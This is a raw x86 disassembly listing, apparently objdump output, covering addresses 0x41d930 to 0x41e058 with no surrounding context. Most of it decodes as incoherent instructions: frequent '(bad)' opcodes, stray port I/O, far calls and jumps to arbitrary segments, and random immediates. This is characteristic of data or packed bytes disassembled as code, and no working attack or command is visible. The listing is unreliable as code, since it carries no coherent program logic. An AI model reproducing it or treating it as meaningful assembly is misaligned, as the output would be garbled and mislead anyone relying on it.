  41d930:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d931:	or     eax,esi
  41d933:	mov    al,ds:0x8a81b336
  41d938:	add    BYTE PTR [esi],dl
  41d93a:	sub    ebp,DWORD PTR [edx+0x495ef063]
  41d940:	mov    ds:0x876ac297,eax
  41d945:	or     ch,BYTE PTR [esi+0x32]
  41d948:	mov    ebp,0x3434b753
  41d94d:	xchg   esi,eax
  41d94e:	push   ebp
  41d94f:	ret    0x266b
  41d952:	fisub  WORD PTR [ebx+0x7e]
  41d955:	xor    bh,0xa6
  41d958:	push   cs
  41d959:	fisub  DWORD PTR [edi-0x72]
  41d95c:	adc    BYTE PTR [ebx+0x56],bl
  41d95f:	sub    eax,0x78e50009
  41d964:	inc    esp
  41d965:	daa    
  41d966:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d967:	js     0x41d901
  41d969:	add    eax,esi
  41d96b:	inc    ecx
  41d96c:	mov    ch,0x3c
  41d96e:	aaa    
  41d96f:	adc    ch,BYTE PTR [ebx-0x52]
  41d972:	fisttp WORD PTR [eax+0x64]
  41d975:	dec    ecx
  41d976:	cdq    
  41d977:	mov    ah,0x84
  41d979:	xor    DWORD PTR [eax-0x62],esi
  41d97c:	loop   0x41d9fb
  41d97e:	jbe    0x41d99b
  41d980:	cmp    dl,BYTE PTR [ecx]
  41d982:	inc    ecx
  41d983:	nop
  41d984:	jns    0x41d987
  41d986:	and    dl,BYTE PTR [eax]
  41d988:	cmp    dl,BYTE PTR [esi-0x3d45c54a]
  41d98e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d98f:	push   es
  41d990:	pop    ss
  41d991:	xor    DWORD PTR [ebx+0x24656e46],esp
  41d997:	xor    al,BYTE PTR [ebp-0x36]
  41d99a:	retf   
  41d99b:	sub    al,0x30
  41d99d:	or     ebp,DWORD PTR [ebp+0x6046293c]
  41d9a3:	test   dh,bl
  41d9a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d9a6:	add    DWORD PTR [ebp+0x3f],eax
  41d9a9:	aas    
  41d9aa:	inc    esp
  41d9ab:	push   ecx
  41d9ac:	pusha  
  41d9ad:	mov    edx,0x6470de17
  41d9b2:	or     al,0x5e
  41d9b4:	loopne 0x41da19
  41d9b6:	mov    dh,0x1a
  41d9b8:	mov    ebp,DWORD PTR [edi]
  41d9ba:	sub    eax,0x116e8654
  41d9bf:	xor    BYTE PTR [edx],dh
  41d9c1:	std    
  41d9c2:	cmp    al,0xf5
  41d9c4:	adc    eax,0x79240ec8
  41d9c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d9ca:	sub    eax,0x9d3bcc59
  41d9cf:	push   ecx
  41d9d0:	push   ebp
  41d9d1:	cwde   
  41d9d2:	adc    BYTE PTR [edi],bl
  41d9d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d9d5:	mov    bh,0xab
  41d9d7:	mov    al,ds:0x9b250156
  41d9dc:	test   eax,0x3ad32d25
  41d9e1:	std    
  41d9e2:	inc    esi
  41d9e3:	cmp    cl,dl
  41d9e5:	xchg   ebp,eax
  41d9e6:	popa   
  41d9e7:	jle    0x41da0c
  41d9e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d9ea:	xchg   esp,eax
  41d9eb:	fnstenv [ecx-0x29]
  41d9ee:	sbb    esp,DWORD PTR [eax]
  41d9f0:	loop   0x41d9e9
  41d9f2:	push   ebp
  41d9f3:	das    
  41d9f4:	push   cs
  41d9f5:	or     BYTE PTR [esi+0x71],cl
  41d9f8:	mov    DWORD PTR [edi-0x4f6c6107],ebx
  41d9fe:	mov    ebp,0xf45dd409
  41da03:	jle    0x41da3a
  41da05:	mov    al,ds:0xea388598
  41da0a:	and    dl,BYTE PTR ds:0x4c67a1d1
  41da10:	mov    al,ds:0xc2041727
  41da15:	das    
  41da16:	in     eax,dx
  41da17:	lea    eax,[esi+0x45]
  41da1a:	dec    ebx
  41da1b:	es lahf 
  41da1d:	mov    ah,0x55
  41da1f:	cmp    BYTE PTR [eax-0x7f],0x6b
  41da23:	adc    BYTE PTR [eax-0x7100c705],0xde
  41da2a:	pop    ebp
  41da2b:	outs   dx,BYTE PTR ds:[esi]
  41da2c:	sti    
  41da2d:	cmp    ebx,DWORD PTR [esi]
  41da2f:	test   eax,0xf1872423
  41da34:	test   eax,0x234d32da
  41da39:	out    0x39,eax
  41da3b:	in     al,0x81
  41da3d:	sbb    eax,0x9f29ca0b
  41da42:	out    0xa,al
  41da44:	cmp    eax,0x573b78cb
  41da49:	sbb    al,0x9a
  41da4b:	jecxz  0x41d9f2
  41da4d:	bound  esi,QWORD PTR [ebx]
  41da4f:	cmc    
  41da50:	pop    ds
  41da51:	popa   
  41da52:	aam    0xd1
  41da54:	add    bl,ah
  41da56:	cwde   
  41da57:	mov    ecx,0x2f7d8d15
  41da5c:	stos   DWORD PTR es:[edi],eax
  41da5d:	or     bl,dh
  41da5f:	fistp  DWORD PTR [ebx-0x24]
  41da62:	sti    
  41da63:	inc    ebx
  41da64:	pop    esp
  41da65:	inc    ebp
  41da66:	mov    esp,fs
  41da68:	mov    eax,ds:0xceaf1c55
  41da6d:	pushf  
  41da6e:	pinsrw mm7,WORD PTR [esi-0x3],0x73
  41da73:	call   0xb993:0xe1a540f8
  41da7a:	add    edi,DWORD PTR [ebx]
  41da7c:	jo     0x41da71
  41da7e:	adc    ecx,eax
  41da80:	xor    ecx,DWORD PTR ds:0x849c4144
  41da86:	add    BYTE PTR [edx],al
  41da88:	test   ah,dl
  41da8a:	cmp    eax,0xab832052
  41da8f:	repnz (bad) 
  41da92:	fidiv  DWORD PTR [ebx]
  41da94:	xchg   edx,eax
  41da95:	mov    ch,0x82
  41da97:	or     eax,0x51b88158
  41da9c:	cmp    dh,ah
  41da9e:	rcl    BYTE PTR [eax],0xf2
  41daa1:	cmp    eax,DWORD PTR [edx]
  41daa3:	lds    ebx,FWORD PTR [edi]
  41daa5:	fnstsw WORD PTR [esi-0x2c33b5f2]
  41daab:	mov    esi,0xbf1cd52c
  41dab0:	imul   edi,DWORD PTR [eax+0x4708ae68],0x62
  41dab7:	inc    eax
  41dab8:	in     eax,0xd8
  41daba:	leave  
  41dabb:	mov    ds:0x45253671,al
  41dac0:	in     al,dx
  41dac1:	fdiv   QWORD PTR [edx+0x43]
  41dac4:	stos   DWORD PTR es:[edi],eax
  41dac5:	push   esi
  41dac6:	push   edi
  41dac7:	fcomp  QWORD PTR [esp+ebx*8+0x6b]
  41dacb:	jno    0x41db25
  41dacd:	shl    BYTE PTR [ebx-0x341b41ab],cl
  41dad3:	loopne 0x41db2a
  41dad5:	xchg   ebx,eax
  41dad6:	push   ecx
  41dad7:	mov    esp,0x5bc759bf
  41dadc:	lock dec edi
  41dade:	cmp    DWORD PTR [ebx],edx
  41dae0:	cdq    
  41dae1:	stos   BYTE PTR es:[edi],al
  41dae2:	aad    0xf7
  41dae4:	add    ch,bh
  41dae6:	sahf   
  41dae7:	lods   al,BYTE PTR ds:[esi]
  41dae8:	adc    al,0xc9
  41daea:	mov    eax,ds:0x2bbbce25
  41daef:	loop   0x41db70
  41daf1:	in     al,dx
  41daf2:	ins    DWORD PTR es:[edi],dx
  41daf3:	xchg   esp,eax
  41daf4:	loop   0x41daa8
  41daf6:	pop    ds
  41daf7:	lds    esp,FWORD PTR [edx]
  41daf9:	jge    0x41db75
  41dafb:	test   edx,edi
  41dafd:	in     eax,0xbc
  41daff:	sub    bh,BYTE PTR [edi]
  41db01:	xchg   esp,eax
  41db02:	dec    esp
  41db03:	jecxz  0x41db5e
  41db05:	addr16 dec ebp
  41db07:	xchg   eax,esi
  41db09:	xchg   edx,eax
  41db0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41db0b:	pop    edx
  41db0c:	adc    DWORD PTR [edx-0x4b],esi
  41db0f:	cmp    bl,BYTE PTR [esi+0x73]
  41db12:	(bad)  
  41db13:	cli    
  41db14:	sbb    eax,0xe1407ad2
  41db19:	inc    ebx
  41db1a:	js     0x41db2c
  41db1c:	rol    DWORD PTR [ebp-0x198625d7],0xc
  41db23:	mov    BYTE PTR [ebx+0x6e],0x1
  41db27:	push   esp
  41db28:	shl    al,0x12
  41db2b:	fcomp  QWORD PTR [ebp-0x1b7f7c3d]
  41db31:	xor    ah,BYTE PTR [ecx]
  41db33:	xchg   esp,eax
  41db34:	scas   al,BYTE PTR es:[edi]
  41db35:	inc    ebx
  41db36:	or     BYTE PTR [edi-0x636e705],ah
  41db3c:	(bad)  
  41db3d:	out    dx,al
  41db3e:	jae    0x41db33
  41db40:	xchg   edx,eax
  41db41:	sbb    al,0xb1
  41db43:	push   0x9f1332
  41db48:	mov    es,WORD PTR [edx]
  41db4a:	dec    esp
  41db4b:	add    al,0xda
  41db4d:	sbb    eax,0x505587a6
  41db52:	fisub  WORD PTR ds:0x86351cee
  41db58:	hlt    
  41db59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41db5a:	xchg   ebp,eax
  41db5b:	pop    es
  41db5c:	mov    BYTE PTR [ebx-0x4582a768],dh
  41db62:	pop    ds
  41db63:	or     bh,dl
  41db65:	(bad)  
  41db66:	imul   ebx,DWORD PTR [ecx-0x56180768],0xb0f02fb5
  41db70:	jae    0x41dbd0
  41db72:	cmp    ebx,DWORD PTR [eax-0xa]
  41db75:	popf   
  41db76:	mov    ebp,0xf4f10f08
  41db7b:	push   ecx
  41db7c:	out    dx,al
  41db7d:	xor    al,0xac
  41db7f:	(bad)  
  41db80:	cmp    bh,BYTE PTR [ebx+0x10a62bdb]
  41db86:	xchg   esp,eax
  41db87:	add    eax,eax
  41db89:	and    al,dl
  41db8b:	shl    edx,1
  41db8d:	clc    
  41db8e:	mov    dh,0x62
  41db90:	add    BYTE PTR [eax],al
  41db92:	ret    
  41db93:	mov    ecx,0xd17b854e
  41db98:	rcl    esp,cl
  41db9a:	push   cs
  41db9b:	bound  ecx,QWORD PTR [ebx-0x17b74ff0]
  41dba1:	data16 jo 0x41db6b
  41dba4:	es push eax
  41dba6:	mov    ecx,0x6751da6c
  41dbab:	mov    bl,0xf
  41dbad:	sbb    bh,BYTE PTR [edx]
  41dbaf:	int    0xd0
  41dbb1:	xchg   ebp,eax
  41dbb2:	adc    ebp,0xffffffdf
  41dbb5:	sahf   
  41dbb6:	cli    
  41dbb7:	jo     0x41db7e
  41dbb9:	out    dx,al
  41dbba:	cmc    
  41dbbb:	pop    ss
  41dbbc:	jmp    0x41db80
  41dbbe:	add    edx,DWORD PTR [ebx-0x7aa40e18]
  41dbc4:	retf   
  41dbc5:	packsswb mm5,QWORD PTR [ecx+ecx*4]
  41dbc9:	adc    ecx,DWORD PTR [ebp+ebx*2+0x48]
  41dbcd:	lock inc ebp
  41dbcf:	adc    DWORD PTR [edx-0x18b795d3],esi
  41dbd5:	jecxz  0x41db57
  41dbd7:	push   0x13
  41dbd9:	std    
  41dbda:	test   eax,0x5b93c6b
  41dbdf:	jmp    0x41dbe5
  41dbe1:	mov    ah,0x10
  41dbe3:	push   edx
  41dbe4:	dec    esp
  41dbe5:	push   0x68
  41dbe7:	pop    edx
  41dbe8:	inc    ebx
  41dbe9:	imul   edi,DWORD PTR [edx],0x609a8f0d
  41dbef:	add    dl,bl
  41dbf1:	test   al,0x73
  41dbf3:	lea    ecx,ss:[edi]
  41dbf6:	adc    al,0x0
  41dbf8:	sub    BYTE PTR [edx],bh
  41dbfa:	test   BYTE PTR [ebp+ebx*1+0x3a],ah
  41dbfe:	lods   al,BYTE PTR ds:[esi]
  41dbff:	or     BYTE PTR [ebx-0x10fc9fe8],dl
  41dc05:	inc    ebx
  41dc06:	test   BYTE PTR [edi+ebx*8],ch
  41dc09:	sbb    al,BYTE PTR [ebp+0x46]
  41dc0c:	fist   WORD PTR [ecx+0x3ec01052]
  41dc12:	(bad)  [ebx]
  41dc14:	scas   eax,DWORD PTR es:[edi]
  41dc15:	pop    edx
  41dc16:	jle    0x41dc7b
  41dc18:	mov    al,0xa
  41dc1a:	sub    BYTE PTR [ebx+edi*8+0x53],cl
  41dc1e:	inc    esi
  41dc1f:	or     esi,DWORD PTR [ecx+0x2a]
  41dc22:	push   esp
  41dc23:	push   ss
  41dc24:	lock lea ebp,[ecx-0x62]
  41dc28:	mov    ecx,0xd6028b01
  41dc2d:	push   edi
  41dc2e:	mov    edx,0xb942e954
  41dc33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dc34:	mov    esi,0x5e6f3787
  41dc39:	stos   BYTE PTR es:[edi],al
  41dc3a:	iret   
  41dc3b:	pop    ds
  41dc3c:	mov    al,ds:0xefa60c23
  41dc41:	test   BYTE PTR [ebp-0x61],0xa2
  41dc45:	aad    0x58
  41dc47:	push   0xfffffffd
  41dc49:	out    dx,eax
  41dc4a:	inc    ecx
  41dc4b:	ret    0x614
  41dc4e:	and    BYTE PTR [ecx+0x69],0x7c
  41dc52:	add    ecx,DWORD PTR [esi+0x1d]
  41dc55:	jns    0x41dc53
  41dc57:	push   ecx
  41dc58:	add    DWORD PTR [edx+0x4395918],eax
  41dc5e:	cld    
  41dc5f:	sub    eax,0x2aae12c1
  41dc64:	loopne 0x41dbef
  41dc66:	add    esi,DWORD PTR [eax+0x2a1084bb]
  41dc6c:	sar    BYTE PTR ds:[eax],1
  41dc6f:	das    
  41dc70:	pop    ss
  41dc71:	ins    DWORD PTR es:[edi],dx
  41dc72:	mov    edi,0x3cec1441
  41dc77:	jns    0x41dcb1
  41dc79:	icebp  
  41dc7a:	leave  
  41dc7b:	jle    0x41dcbe
  41dc7d:	adc    eax,0xc023a20a
  41dc82:	or     al,0x99
  41dc84:	jno    0x41dc20
  41dc86:	xor    BYTE PTR [ebx],bh
  41dc88:	push   ebp
  41dc89:	daa    
  41dc8a:	dec    ecx
  41dc8b:	jmp    0x41dc39
  41dc8d:	adc    DWORD PTR [ecx],edx
  41dc8f:	sbb    BYTE PTR [ebp+edi*4-0x3f],0x91
  41dc94:	fiadd  WORD PTR ds:0x351e32b4
  41dc9a:	jb     0x41dd17
  41dc9c:	int    0xd8
  41dc9e:	fcomp  st(2)
  41dca0:	call   0xa9a1:0xf8264a9b
  41dca7:	add    al,BYTE PTR fs:[ebx+0x3e34303]
  41dcae:	pop    esp
  41dcaf:	dec    edx
  41dcb0:	adc    eax,0x2765d23b
  41dcb5:	cmp    al,0x91
  41dcb7:	push   edx
  41dcb8:	inc    esi
  41dcb9:	mov    dl,BYTE PTR [eax+0x24043886]
  41dcbf:	shr    BYTE PTR [ebp+0x48],0x43
  41dcc3:	xchg   DWORD PTR [edi-0x6b1ece03],ebp
  41dcc9:	sub    ebx,DWORD PTR [ebx]
  41dccb:	leave  
  41dccc:	mov    ebx,0xefec82e8
  41dcd1:	mov    ecx,0xf8cde0a4
  41dcd6:	popf   
  41dcd7:	mov    esp,0x7c56c3bf
  41dcdc:	mov    ebx,DWORD PTR [edi]
  41dcde:	mov    al,0x4b
  41dce0:	imul   ecx,ecx,0x5c
  41dce3:	mov    cl,0x56
  41dce5:	rol    BYTE PTR [esi-0x19302748],1
  41dceb:	cmp    edi,DWORD PTR [eax-0x51e30514]
  41dcf1:	pop    ds
  41dcf2:	loope  0x41dcdb
  41dcf4:	(bad)  
  41dcf5:	or     ah,BYTE PTR [eax]
  41dcf7:	rol    bh,cl
  41dcf9:	ja     0x41dcea
  41dcfb:	mov    eax,0xbbb9b7fc
  41dd00:	push   edx
  41dd01:	xchg   ecx,eax
  41dd02:	add    ebx,DWORD PTR [ebx]
  41dd04:	adc    DWORD PTR [ebp+0x4b],ebx
  41dd07:	adc    ah,BYTE PTR [ebx-0x3c]
  41dd0a:	dec    eax
  41dd0b:	inc    edi
  41dd0c:	xlat   BYTE PTR ds:[ebx]
  41dd0d:	and    dh,BYTE PTR [ecx-0x376cf4c]
  41dd13:	mov    esp,DWORD PTR [edi+0x8]
  41dd16:	push   esp
  41dd17:	retf   
  41dd18:	add    esp,DWORD PTR [ecx+0xf]
  41dd1b:	adc    esi,DWORD PTR [ecx]
  41dd1d:	bound  edi,QWORD PTR [eax-0x25]
  41dd20:	shr    DWORD PTR [eax+eiz*4-0x498d65ba],1
  41dd27:	adc    edi,DWORD PTR [edx-0x2bd9acee]
  41dd2d:	jl     0x41dd01
  41dd2f:	xchg   DWORD PTR [edi],eax
  41dd31:	popa   
  41dd32:	fadd   QWORD PTR [eax]
  41dd34:	and    DWORD PTR [ebx-0x45],edx
  41dd37:	popa   
  41dd38:	ins    BYTE PTR es:[edi],dx
  41dd39:	sub    ch,BYTE PTR [ebp+0x11]
  41dd3c:	call   0xa242edbe
  41dd41:	into   
  41dd42:	or     ch,al
  41dd44:	(bad)  
  41dd46:	retf   
  41dd47:	(bad)  
  41dd49:	js     0x41dcf0
  41dd4b:	inc    edi
  41dd4c:	mov    BYTE PTR [edi],ch
  41dd4e:	jl     0x41dd96
  41dd50:	sbb    eax,0x6608ca8a
  41dd55:	push   cs
  41dd56:	mov    al,ds:0x744a645b
  41dd5b:	mov    ds:0x37675fd1,eax
  41dd60:	aam    0x43
  41dd62:	pop    ss
  41dd63:	cmp    DWORD PTR [esi+0x29],esi
  41dd66:	jp     0x41dd72
  41dd68:	lock push esp
  41dd6a:	mov    cl,0x5b
  41dd6c:	outs   dx,BYTE PTR ds:[esi]
  41dd6d:	in     al,0x70
  41dd6f:	call   0x25f9:0x773622eb
  41dd76:	xchg   ebx,eax
  41dd77:	and    ebp,DWORD PTR [ebx]
  41dd79:	jp     0x41dde3
  41dd7b:	cli    
  41dd7c:	and    al,0x3a
  41dd7e:	nop
  41dd7f:	mov    eax,ds:0x15f68d5b
  41dd84:	mov    ds:0xae2fbded,al
  41dd89:	inc    ebx
  41dd8a:	adc    BYTE PTR [eax+0x48],cl
  41dd8d:	mov    bh,0x1f
  41dd8f:	es jl  0x41dd96
  41dd92:	inc    edx
  41dd93:	pop    ss
  41dd94:	(bad)  
  41dd95:	sar    DWORD PTR [ebp+0x8],1
  41dd98:	xor    BYTE PTR [esi+0x5c9e42e3],dh
  41dd9e:	xor    bl,BYTE PTR [edx]
  41dda0:	aas    
  41dda1:	ss hlt 
  41dda3:	xor    BYTE PTR [ebx-0x2845a1dc],bl
  41dda9:	jo     0x41dd96
  41ddab:	(bad)  
  41ddac:	sub    esi,ebp
  41ddae:	and    DWORD PTR [ecx+0x1add6d72],esp
  41ddb4:	test   al,0x2e
  41ddb6:	loope  0x41de32
  41ddb8:	pop    ebp
  41ddb9:	pop    edx
  41ddba:	mov    ?,WORD PTR ds:0x6af0c349
  41ddc0:	shr    BYTE PTR [esi],cl
  41ddc2:	(bad)  
  41ddc3:	(bad)  
  41ddc5:	push   eax
  41ddc6:	adc    ch,BYTE PTR [edx+0x601a2917]
  41ddcc:	cmp    eax,0x51a4a59d
  41ddd1:	add    esi,DWORD PTR [edi]
  41ddd3:	popa   
  41ddd4:	dec    ebp
  41ddd5:	xchg   esp,eax
  41ddd6:	pause  
  41ddd8:	stos   DWORD PTR es:[edi],eax
  41ddd9:	cmp    ecx,DWORD PTR [esi+ebx*1]
  41dddc:	int3   
  41dddd:	dec    ecx
  41ddde:	bound  ecx,QWORD PTR [esi]
  41dde0:	sbb    BYTE PTR [esi+0x6f],0xa3
  41dde4:	fnstsw WORD PTR [ebp-0x2e]
  41dde7:	and    dl,dl
  41dde9:	inc    edx
  41ddea:	fisttp WORD PTR [ebx-0x7a]
  41dded:	fxch   st(4)
  41ddef:	cmp    edx,esp
  41ddf1:	mov    edx,0xf8a70e13
  41ddf6:	(bad)  
  41ddf7:	ja     0x41de48
  41ddf9:	rcr    BYTE PTR ds:0xf6aa56bd,0x4f
  41de00:	xchg   edx,eax
  41de01:	or     edi,edi
  41de03:	sub    dh,BYTE PTR [edx]
  41de05:	lods   eax,DWORD PTR ds:[esi]
  41de06:	clc    
  41de07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41de08:	xor    al,0xff
  41de0a:	adc    ah,BYTE PTR [edx+0x11]
  41de0d:	pop    eax
  41de0e:	pop    es
  41de0f:	xchg   BYTE PTR [eax],bh
  41de11:	(bad)  
  41de12:	push   ebx
  41de13:	enter  0x4c31,0x37
  41de17:	jo     0x41de7b
  41de19:	add    DWORD PTR [edi],edi
  41de1b:	push   edx
  41de1c:	repz fisub WORD PTR [ebp-0x8]
  41de20:	fwait
  41de21:	lock int3 
  41de23:	pop    edi
  41de24:	pop    ss
  41de25:	mov    ebp,0xf7d7744e
  41de2a:	and    BYTE PTR ds:0x4399e5cf,bh
  41de30:	inc    esp
  41de31:	loopne 0x41de26
  41de33:	inc    edi
  41de34:	mov    edi,0xee5e14b8
  41de39:	test   BYTE PTR [bp+di],ah
  41de3c:	sbb    esp,DWORD PTR [esi-0x53]
  41de3f:	ja     0x41de0b
  41de41:	loop   0x41dea0
  41de43:	push   ecx
  41de44:	hlt    
  41de45:	mov    ebx,0x1fffa8d8
  41de4a:	shr    ebx,0x2
  41de4d:	push   ebp
  41de4e:	xor    al,0x5
  41de50:	shr    eax,cl
  41de52:	push   ecx
  41de53:	mov    al,0x94
  41de55:	mov    cl,0x1d
  41de57:	inc    esp
  41de58:	mov    esp,?
  41de5a:	and    ebx,esp
  41de5c:	and    DWORD PTR [edx-0x1f],ebp
  41de5f:	int    0x46
  41de61:	mov    bh,0x99
  41de63:	pop    es
  41de64:	and    ah,BYTE PTR [ebp+edi*1-0x18]
  41de68:	xor    BYTE PTR [esp+eax*1],bl
  41de6b:	xchg   esi,eax
  41de6c:	scas   eax,DWORD PTR es:[edi]
  41de6d:	popf   
  41de6e:	and    DWORD PTR [ecx-0x4b],0xffffffa1
  41de72:	fisttp QWORD PTR [edi]
  41de74:	pop    ecx
  41de75:	ret    0x5b67
  41de78:	push   ecx
  41de79:	xor    eax,0xf4c6928
  41de7e:	stos   BYTE PTR es:[edi],al
  41de7f:	xchg   BYTE PTR [edx-0x5b28d6eb],bh
  41de85:	push   eax
  41de86:	aas    
  41de87:	mov    ecx,0xb90d0b8e
  41de8c:	fcmovnu st,st(2)
  41de8e:	push   ds
  41de8f:	mov    ebp,0xde573990
  41de94:	stc    
  41de95:	adc    eax,0x5d600b73
  41de9a:	ins    BYTE PTR es:[edi],dx
  41de9b:	and    al,0xae
  41de9d:	jns    0x41deb2
  41de9f:	inc    edx
  41dea0:	jae    0x41deee
  41dea2:	inc    eax
  41dea3:	jb     0x41defb
  41dea5:	data16 loopne 0x41de2b
  41dea8:	icebp  
  41dea9:	or     bl,BYTE PTR [eax+eax*1-0x4f]
  41dead:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41deae:	mov    al,0xed
  41deb0:	push   ds
  41deb1:	mov    ch,0xce
  41deb3:	(bad)  
  41deb4:	out    0x67,al
  41deb6:	mov    ds:0x2876ef28,eax
  41debb:	jecxz  0x41de74
  41debd:	push   0x4729c459
  41dec2:	mov    al,ds:0x929de2ba
  41dec7:	pop    edi
  41dec8:	xor    eax,0xe662ed18
  41decd:	rcl    DWORD PTR [ebp-0x78],1
  41ded0:	dec    edi
  41ded1:	lea    ecx,[ecx-0x37]
  41ded4:	scas   al,BYTE PTR es:[edi]
  41ded5:	shl    DWORD PTR [eax],0x8e
  41ded8:	sbb    al,0xfe
  41deda:	cli    
  41dedb:	adc    DWORD PTR [esi],edx
  41dedd:	es addr16 fwait
  41dee0:	popa   
  41dee1:	in     al,dx
  41dee2:	loope  0x41de90
  41dee4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dee5:	push   ss
  41dee6:	fisubr WORD PTR [ebx+0x1bf5fcae]
  41deec:	jno    0x41df51
  41deee:	jne    0x41de96
  41def0:	xchg   ebp,eax
  41def1:	inc    edi
  41def2:	mov    esp,0xeee82c72
  41def7:	xchg   esi,eax
  41def8:	mov    WORD PTR [eax],?
  41defa:	xchg   ebx,eax
  41defb:	rcr    BYTE PTR [ebp+eax*4-0x23cc47b7],1
  41df02:	push   ss
  41df03:	push   0x59
  41df05:	ja     0x41df63
  41df07:	fist   WORD PTR [esi+edi*2+0x1b]
  41df0b:	in     eax,0xa5
  41df0d:	(bad)  
  41df0e:	int    0xaf
  41df10:	dec    esp
  41df11:	pushf  
  41df12:	fidiv  DWORD PTR ds:0x39764df7
  41df18:	and    al,0x91
  41df1a:	lods   eax,DWORD PTR ss:[esi]
  41df1c:	loop   0x41ded7
  41df1e:	mov    eax,ds:0xa139ea4c
  41df23:	fs fdivr st(2),st
  41df26:	push   es
  41df27:	push   eax
  41df28:	sub    dh,dl
  41df2a:	xor    al,0xb2
  41df2c:	push   edx
  41df2d:	fs fsubrp st(0),st
  41df30:	lods   al,BYTE PTR ds:[esi]
  41df31:	lea    eax,[edx-0x2e]
  41df34:	loop   0x41df94
  41df36:	adc    BYTE PTR [ebx],dh
  41df38:	ret    0x9153
  41df3b:	fld    DWORD PTR [ecx+ecx*8]
  41df3e:	adc    cl,BYTE PTR [esi]
  41df40:	or     al,0xdd
  41df42:	popf   
  41df43:	inc    eax
  41df44:	enter  0x364,0x18
  41df48:	sub    al,0x33
  41df4a:	dec    edx
  41df4b:	add    DWORD PTR [ebx+0x2bd5bd36],esp
  41df51:	int3   
  41df52:	xchg   ebp,eax
  41df53:	(bad)  
  41df54:	mov    dl,0x6c
  41df56:	fadd   QWORD PTR [esi+0x28934515]
  41df5c:	xor    DWORD PTR [ecx-0x1b],edi
  41df5f:	push   cs
  41df60:	in     al,dx
  41df61:	pushf  
  41df62:	adc    al,0xdc
  41df65:	ficomp DWORD PTR [ecx+edx*4]
  41df68:	in     eax,dx
  41df69:	das    
  41df6a:	into   
  41df6b:	mov    esp,DWORD PTR [edi+eax*4]
  41df6e:	(bad)  
  41df6f:	sbb    ecx,ebp
  41df71:	faddp  st(0),st
  41df73:	pop    esp
  41df74:	push   edi
  41df75:	mov    al,ds:0x9a92346f
  41df7a:	xlat   BYTE PTR ds:[ebx]
  41df7b:	cmp    esp,ecx
  41df7d:	arpl   cx,cx
  41df7f:	ins    DWORD PTR es:[edi],dx
  41df80:	or     DWORD PTR [edx-0x26],edx
  41df83:	mov    ebp,0x9d4e681d
  41df88:	std    
  41df89:	jecxz  0x41e009
  41df8b:	dec    ebx
  41df8c:	and    esi,esp
  41df8e:	push   ebp
  41df8f:	jmp    0x41df98
  41df91:	jp     0x41dfbe
  41df93:	inc    ebp
  41df94:	pusha  
  41df95:	push   ss
  41df96:	(bad)  
  41df97:	cli    
  41df98:	sub    BYTE PTR ds:0x5e352e8b,bh
  41df9e:	inc    esi
  41df9f:	stc    
  41dfa0:	xchg   ebx,eax
  41dfa1:	mov    bl,0x1a
  41dfa3:	mov    BYTE PTR [ebp+0x2b],ch
  41dfa6:	cmp    BYTE PTR [ebp+0x3348c2eb],ch
  41dfac:	subps  xmm0,xmm6
  41dfaf:	or     al,0x4f
  41dfb1:	inc    eax
  41dfb2:	je     0x41df9c
  41dfb4:	xlat   BYTE PTR ds:[ebx]
  41dfb5:	in     al,0x5f
  41dfb7:	jl     0x41df69
  41dfb9:	popa   
  41dfba:	ss jl  0x41df5f
  41dfbd:	xchg   esp,eax
  41dfbe:	daa    
  41dfbf:	push   eax
  41dfc0:	aas    
  41dfc1:	add    eax,DWORD PTR [edx]
  41dfc3:	mov    BYTE PTR [ebx+0x67],ch
  41dfc6:	dec    ebp
  41dfc7:	dec    esp
  41dfc8:	ficomp DWORD PTR [edx]
  41dfca:	js     0x41df7c
  41dfcc:	mul    BYTE PTR [ebx]
  41dfce:	adc    BYTE PTR [esi],0x3f
  41dfd1:	dec    ecx
  41dfd2:	mov    bh,0x6e
  41dfd4:	out    0x67,al
  41dfd6:	shl    DWORD PTR [eax],0xce
  41dfd9:	and    al,0xdc
  41dfdb:	jmp    DWORD PTR [ecx]
  41dfdd:	mov    cs,ebx
  41dfdf:	jmp    0xbfb8:0x30fe9f38
  41dfe6:	aaa    
  41dfe7:	lahf   
  41dfe8:	push   cs
  41dfe9:	inc    ebp
  41dfea:	stc    
  41dfeb:	add    esi,ebx
  41dfed:	dec    ecx
  41dfee:	adc    BYTE PTR ds:0xe717eeea,bl
  41dff4:	mov    eax,0x39bb36ea
  41dff9:	or     ebx,DWORD PTR es:[esi-0x21]
  41dffd:	loope  0x41e060
  41dfff:	jo     0x41e050
  41e001:	out    0xa7,al
  41e003:	dec    eax
  41e004:	out    dx,eax
  41e005:	dec    edi
  41e006:	sub    DWORD PTR [ebx-0x31],0x5c9bc8e1
  41e00d:	xchg   ebx,eax
  41e00e:	cmc    
  41e00f:	xor    eax,eax
  41e011:	push   ebx
  41e012:	xchg   DWORD PTR [edx+eax*4-0x23],ecx
  41e016:	ds dec ebp
  41e018:	and    eax,0xffffff93
  41e01b:	push   0xffffffbf
  41e01d:	aad    0x56
  41e01f:	mov    bl,0xae
  41e021:	adc    eax,0x523b73a0
  41e026:	ror    dl,1
  41e028:	addr16 jns 0x41e017
  41e02b:	push   ss
  41e02c:	add    edx,DWORD PTR [edi+0x5ae2a8c4]
  41e032:	dec    esp
  41e033:	mov    edi,0xb66542e0
  41e038:	push   cs
  41e039:	or     esi,DWORD PTR [edx-0x3a]
  41e03c:	cli    
  41e03d:	int3   
  41e03e:	push   esp
  41e03f:	cmp    dh,dl
  41e041:	and    BYTE PTR [edx+0x5a4105cf],ah
  41e047:	ja     0x41e08e
  41e049:	dec    esp
  41e04a:	mov    bh,0xe9
  41e04c:	(bad)
  41e04f:	das    
  41e050:	sub    al,0xa6
  41e052:	out    dx,eax
  41e053:	fcom   QWORD PTR [eax]
  41e055:	sub    esi,DWORD PTR [esi]
  41e057:	push   ss
  41e058:	cwde   
